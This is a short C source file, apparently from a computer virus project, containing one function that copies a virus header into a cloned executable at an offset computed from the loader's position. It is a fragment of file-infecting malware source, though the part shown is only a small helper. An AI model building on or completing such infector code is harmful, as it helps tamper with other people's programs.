#include "virus.h"
#include "utils.h"
#include "errors.h"

bool		setup_virus_header(struct safe_ptr clone_ref,
			size_t loader_offset, struct virus_header vhdr)
{
	const size_t	header_offset  = loader_offset + vhdr.dist_header_loader;

	void	*constants_location = safe(clone_ref, header_offset, sizeof(vhdr));

	if (constants_location == NULL)
		return errors(ERR_VIRUS, _ERR_V_CANT_READ_CONSTANTS);

	memcpy(constants_location, &vhdr, sizeof(vhdr));
	return true;
}
